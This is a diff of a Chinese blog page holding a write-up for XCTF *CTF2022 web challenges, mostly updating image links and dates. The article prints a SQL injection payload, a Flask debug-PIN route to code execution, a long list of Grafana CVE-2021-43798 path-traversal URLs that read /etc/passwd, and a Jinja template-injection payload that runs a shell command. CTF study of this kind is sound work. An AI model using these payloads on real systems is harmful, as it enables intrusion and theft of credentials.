@@ -9,32 +9,32 @@
     <meta name="description" content="文章首发于奇安信攻防社区: https:&#x2F;&#x2F;forum.butian.net&#x2F;share&#x2F;1511  oh-my-notepro登录没有做限制，仅与登录的用户名有关 登陆后创建文件，并进行访问view?note_id&#x3D;XXXX，此时修改note_id的值会发生报错，并且进入到flask的Debug中  从Debug反馈的报错中可知这里存在执行了SQL语句，测试后发现存在SQL注入，Payload">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XCTF *CTF2022 Writeup">
-<meta property="og:url" content="http://example.com/2022/05/27/starCTF2022/index.html">
+<meta property="og:url" content="http://example.com/2022/06/05/starCTF2022/index.html">
 <meta property="og:site_name" content="一只安服仔">
 <meta property="og:description" content="文章首发于奇安信攻防社区: https:&#x2F;&#x2F;forum.butian.net&#x2F;share&#x2F;1511  oh-my-notepro登录没有做限制，仅与登录的用户名有关 登陆后创建文件，并进行访问view?note_id&#x3D;XXXX，此时修改note_id的值会发生报错，并且进入到flask的Debug中  从Debug反馈的报错中可知这里存在执行了SQL语句，测试后发现存在SQL注入，Payload">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417174814841.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417020844827.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417020859080.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417195858017.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417200156210.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417200914217.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417201136709.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417020920307.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417202231910.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417202730619.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417020942210.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417205703673.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417021020093.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417210854970.png">
-<meta property="article:published_time" content="2022-05-27T03:23:51.373Z">
-<meta property="article:modified_time" content="2022-04-19T09:55:31.366Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417174814841.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417020844827.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417020859080.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417195858017.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417200156210.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417200914217.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417201136709.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417020920307.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417202231910.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417202730619.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417020942210.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417205703673.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417021020093.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417210854970.png">
+<meta property="article:published_time" content="2022-06-05T02:09:56.318Z">
+<meta property="article:modified_time" content="2022-06-06T16:25:42.430Z">
 <meta property="article:author" content="atao">
 <meta property="article:tag" content="Web">
 <meta property="article:tag" content="Writeup">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417174814841.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417174814841.png">
     
     
       
@@ -92,10 +92,8 @@
     <span id="actions">
       <ul>
         
-        <li><a class="icon" aria-label="上一篇" href="/2022/05/27/HMGCTF2022/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
-        
-        <li><a class="icon" aria-label="下一篇" href="/2022/05/27/DASCTF2022_4th/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="下一篇" href="/2022/06/05/HMGCTF2022/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
@@ -108,17 +106,17 @@
     <br/>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/05/27/starCTF2022/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/05/27/starCTF2022/&text=XCTF *CTF2022 Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/05/27/starCTF2022/&title=XCTF *CTF2022 Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/05/27/starCTF2022/&is_video=false&description=XCTF *CTF2022 Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=XCTF *CTF2022 Writeup&body=Check out this article: http://example.com/2022/05/27/starCTF2022/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/05/27/starCTF2022/&title=XCTF *CTF2022 Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/05/27/starCTF2022/&title=XCTF *CTF2022 Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/05/27/starCTF2022/&title=XCTF *CTF2022 Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/05/27/starCTF2022/&title=XCTF *CTF2022 Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/05/27/starCTF2022/&name=XCTF *CTF2022 Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/05/27/starCTF2022/&t=XCTF *CTF2022 Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/06/05/starCTF2022/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/06/05/starCTF2022/&text=XCTF *CTF2022 Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/06/05/starCTF2022/&title=XCTF *CTF2022 Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/06/05/starCTF2022/&is_video=false&description=XCTF *CTF2022 Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XCTF *CTF2022 Writeup&body=Check out this article: http://example.com/2022/06/05/starCTF2022/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/06/05/starCTF2022/&title=XCTF *CTF2022 Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/06/05/starCTF2022/&title=XCTF *CTF2022 Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/06/05/starCTF2022/&title=XCTF *CTF2022 Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/06/05/starCTF2022/&title=XCTF *CTF2022 Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/06/05/starCTF2022/&name=XCTF *CTF2022 Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/06/05/starCTF2022/&t=XCTF *CTF2022 Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -147,7 +145,7 @@
       
     <div class="postdate">
       
-        <time datetime="2022-05-27T03:23:51.373Z" itemprop="datePublished">2022-05-27</time>
+        <time datetime="2022-06-05T02:09:56.318Z" itemprop="datePublished">2022-06-05</time>
         
       
     </div>
@@ -178,7 +176,7 @@
 </blockquote>
 <h3 id="oh-my-notepro"><a href="#oh-my-notepro" class="headerlink" title="oh-my-notepro"></a>oh-my-notepro</h3><p>登录没有做限制，仅与登录的用户名有关</p>
 <p>登陆后创建文件，并进行访问<code>view?note_id=XXXX</code>，此时修改<code>note_id</code>的值会发生报错，并且进入到<code>flask</code>的<code>Debug</code>中</p>
-<p><img src="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417174814841.png" alt="image-20220417174814841"></p>
+<p><img src="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417174814841.png" alt="image-20220417174814841"></p>
 <p>从<code>Debug</code>反馈的报错中可知这里存在执行了SQL语句，测试后发现存在SQL注入，Payload为<code>/view?note_id=-1&#39;union select 1,2,3,4,5--+</code></p>
 <p>这里<code>flask</code>是开启了<code>Debug</code>，存在计算PIN码导致任意代码执行的漏洞。因为存在SQL联合查询，一开始想直接通过<code>load_file()</code>函数直接读取文件，但发现不行，查看了<code>@@secure_file_priv</code>发现设置了目录</p>
 <p>这里可以使用<code>load data local infile</code>进行文件读取，它是不受<code>@@secure_file_priv</code>，但是它有个条件是需要堆叠注入才行(不过这里是存在堆叠的)</p>
@@ -197,8 +195,8 @@
 <p>不知道是否为上述机制的问题，如果是的话这个静态环境的问题让人有点小闹心，笔者从下午弄到了凌晨才成功执行了代码</p>
 </blockquote>
 <p>最后就是导入<code>os</code>库，然后执行命令</p>
-<p><img src="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417020844827.png" alt="image-20220417020844827"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417020859080.png" alt="image-20220417020859080"></p>
+<p><img src="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417020844827.png" alt="image-20220417020844827"></p>
+<p><img src="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417020859080.png" alt="image-20220417020859080"></p>
 <h3 id="oh-my-lotto"><a href="#oh-my-lotto" class="headerlink" title="oh-my-lotto"></a>oh-my-lotto</h3><p>给了Docker环境，有代码的题目真好</p>
 <p>关键代码如下</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">flag = os.getenv(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">lotto_key = request.form.get(<span class="string">&#x27;lotto_key&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">lotto_value = request.form.get(<span class="string">&#x27;lotto_value&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    lotto_key = lotto_key.upper()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line">    message = <span class="string">&#x27;Lotto Error!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;lotto.html&#x27;</span>, message=message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> safe_check(lotto_key):</span><br><span class="line">    os.environ[lotto_key] = lotto_value</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.system(<span class="string">&#x27;wget --content-disposition -N lotto&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">&quot;/app/lotto_result.txt&quot;</span>):</span><br><span class="line">            lotto_result = <span class="built_in">open</span>(<span class="string">&quot;/app/lotto_result.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lotto_result = <span class="string">&#x27;result&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">&quot;/app/guess/forecast.txt&quot;</span>):</span><br><span class="line">            forecast = <span class="built_in">open</span>(<span class="string">&quot;/app/guess/forecast.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            forecast = <span class="string">&#x27;forecast&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> forecast == lotto_result:</span><br><span class="line">            <span class="keyword">return</span> flag</span><br></pre></td></tr></table></figure>
@@ -206,27 +204,27 @@
 <p>可以修改一个环境变量的参数，然后会执行<code>wget</code>命令，最后比较<code>/app/lotto_result.txt</code>和<code>/app/guess/forecast.txt</code>文件内容是否相等</p>
 <p>如果不进行文件下载的话，<code>/app/lotto_result.txt</code>不存在，则它会用<code>result</code>作为替代，这样比较的就是一个固定值，而不用预测了</p>
 <p>因为这里的<code>wget</code>是相对路径，他会去环境变量中找<code>PATH</code>从而确定绝对路径然后执行命令。这里只需要替换<code>PATH</code>值，导致<code>wget</code>执行失败</p>
-<p><img src="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417195858017.png" alt="image-20220417195858017"></p>
+<p><img src="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417195858017.png" alt="image-20220417195858017"></p>
 <p>然后就发现了一个大坑，Python3中<code>bytes</code>和<code>str</code>类型尽管值一样，类型不同仍然是<code>False</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417200156210.png" alt="image-20220417200156210"></p>
+<p><img src="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417200156210.png" alt="image-20220417200156210"></p>
 <p>所以这里需要用到<code>/result</code>路由可以来解决，该路由的作用是查看前一次随机数</p>
 <p>所以这里需要先让它生成一次随机数，然后查看随机数，接着再利用上述的方式即可</p>
-<p><img src="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417200914217.png" alt="image-20220417200914217"></p>
+<p><img src="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417200914217.png" alt="image-20220417200914217"></p>
 <p>查看随机数</p>
-<p><img src="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417201136709.png" alt="image-20220417201136709"></p>
+<p><img src="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417201136709.png" alt="image-20220417201136709"></p>
 <p>这里上传文件时需要注意，要把<code>\r</code>删点，不然两者依然是不相等的</p>
 <p>最后修改<code>PATH</code>环境变量，获取flag</p>
-<p><img src="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417020920307.png" alt="image-20220417020920307"></p>
+<p><img src="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417020920307.png" alt="image-20220417020920307"></p>
 <h3 id="oh-my-grafana"><a href="#oh-my-grafana" class="headerlink" title="oh-my-grafana"></a>oh-my-grafana</h3><p><code>grafana</code>版本是<code>8.2.6</code>，存在<code>CVE-2021-43798</code>任意文件读取的漏洞</p>
 <p>这里需要一个存在的插件地址，受影响的插件大致如下</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">/public/plugins/alertmanager/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/grafana/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/loki/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/postgres/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/mixed/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/prometheus/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/cloudwatch/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/graphite/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/mssql/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/tempo/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/dashboard/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/influxdb/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/mysql/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/testdata/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/elasticsearch/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/jaeger/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/opentsdb/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/zipkin/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/alertGroups/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/bargauge/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/debug/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/graph/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/live/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/piechart/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/status-history/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/timeseries/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/alertlist/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/gauge/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/heatmap/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/logs/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/pluginlist/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/table/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/welcome/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/annolist/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/canvas/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/geomap/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/histogram/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/news/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/stat/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/table-old/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/xychart/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/barchart/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/dashlist/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/gettingstarted/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/nodeGraph/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/state-timeline/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/text/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
 
 <p>可以利用该漏洞读取<code>/etc/grafana/grafana.ini</code>获取<code>admin_password</code>进行登录</p>
-<p><img src="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417202231910.png" alt="image-20220417202231910"></p>
+<p><img src="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417202231910.png" alt="image-20220417202231910"></p>
 <p>接着可以看到一个<code>Mysql</code>的数据源</p>
-<p><img src="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417202730619.png" alt="image-20220417202730619"></p>
+<p><img src="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417202730619.png" alt="image-20220417202730619"></p>
 <p>然后因为是公共环境，点击输入框就会自己跳出相应的表名和列名，最后执行即可(这里应该蹭到车)</p>
-<p><img src="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417020942210.png" alt="image-20220417020942210"></p>
+<p><img src="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417020942210.png" alt="image-20220417020942210"></p>
 <h3 id="oh-my-lotto-revenge"><a href="#oh-my-lotto-revenge" class="headerlink" title="oh-my-lotto-revenge"></a>oh-my-lotto-revenge</h3><p>升级版，最主要的差别：这里即使两个文件相同也不会返回<code>flag</code>，所以出题人应该是想要让人Getshell获取<code>flag</code></p>
 <p>这里主要参考文章：<a target="_blank" rel="noopener" href="https://www.gnu.org/software/wget/manual/wget.html">https://www.gnu.org/software/wget/manual/wget.html</a></p>
 <p>在其第6点说明了<code>wget</code>存在一个配置文件，可以利用该配置文件设置参数(这些参数可以在文档下面找到)，<code>wget</code>执行时，会去加载配置文件的参数，该配置文件也可以由自己设置</p>
@@ -239,12 +237,12 @@
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__.__getitem__(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;env&quot;</span>).<span class="built_in">read</span>()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>将上面的内容存在vps上，并在当前文件夹中开启HTTP服务</p>
-<p><img src="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417205703673.png" alt="image-20220417205703673"></p>
+<p><img src="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417205703673.png" alt="image-20220417205703673"></p>
 <p>上传配置文件内容</p>
 <p>最后修改<code>WGETRC=/app/guess/forecast.txt</code>，访问<code>/</code>获取flag</p>
-<p><img src="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417021020093.png" alt="image-20220417021020093"></p>
+<p><img src="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417021020093.png" alt="image-20220417021020093"></p>
 <p>这里一开始是想用<code>post_file</code>标签直接将<code>/proc/self/environ</code>文件外带出来的，但是测试发现并不行(不知道是不是权限的问题)，但是进入<code>Docker</code>中是可以读取该文件的，求知道的师傅解答一下！！！</p>
-<p><img src="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220417210854970.png" alt="image-20220417210854970"></p>
+<p><img src="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220417210854970.png" alt="image-20220417210854970"></p>
 
   </div>
 </article>
@@ -275,17 +273,17 @@
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/05/27/starCTF2022/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/05/27/starCTF2022/&text=XCTF *CTF2022 Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/05/27/starCTF2022/&title=XCTF *CTF2022 Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/05/27/starCTF2022/&is_video=false&description=XCTF *CTF2022 Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=XCTF *CTF2022 Writeup&body=Check out this article: http://example.com/2022/05/27/starCTF2022/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/05/27/starCTF2022/&title=XCTF *CTF2022 Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/05/27/starCTF2022/&title=XCTF *CTF2022 Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/05/27/starCTF2022/&title=XCTF *CTF2022 Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/05/27/starCTF2022/&title=XCTF *CTF2022 Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/05/27/starCTF2022/&name=XCTF *CTF2022 Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/05/27/starCTF2022/&t=XCTF *CTF2022 Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/06/05/starCTF2022/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/06/05/starCTF2022/&text=XCTF *CTF2022 Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
